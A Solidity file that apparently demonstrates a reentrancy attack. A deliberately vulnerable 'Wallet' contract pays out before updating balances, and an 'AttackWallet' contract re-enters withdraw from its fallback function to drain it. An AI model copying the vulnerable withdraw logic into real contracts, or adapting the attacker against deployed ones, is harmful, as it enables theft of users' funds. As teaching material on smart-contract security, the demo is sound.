// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;


contract Wallet {
  
  mapping(address => uint) public balances;
  
  function deposit(address _to) public payable {
    balances[_to] = balances[_to]+msg.value;
  }
 
  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }
 
  function withdraw(uint _amount) public {
    bool checkstatus;
    if(balances[msg.sender] >= _amount) {
        
      (checkstatus,) = msg.sender.call{value:_amount}('');
      if(checkstatus) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
 
}
 
contract AttackWallet {
 
    Wallet reInstance;
    
    function getEther() public{
        payable(msg.sender).transfer(payable(address(this)).balance);
    }
    
    constructor(address _addr) {
        reInstance = Wallet(payable(_addr));
    }
    function callDeposit() public payable{
        reInstance.deposit{value:msg.value}(address(this));
    }
 
    function attack() public {
        reInstance.withdraw(1 gwei);
    }
 
    fallback() external payable {
      if(address(reInstance).balance >= 1 gwei){
        reInstance.withdraw(1 gwei);
      }
  }
}
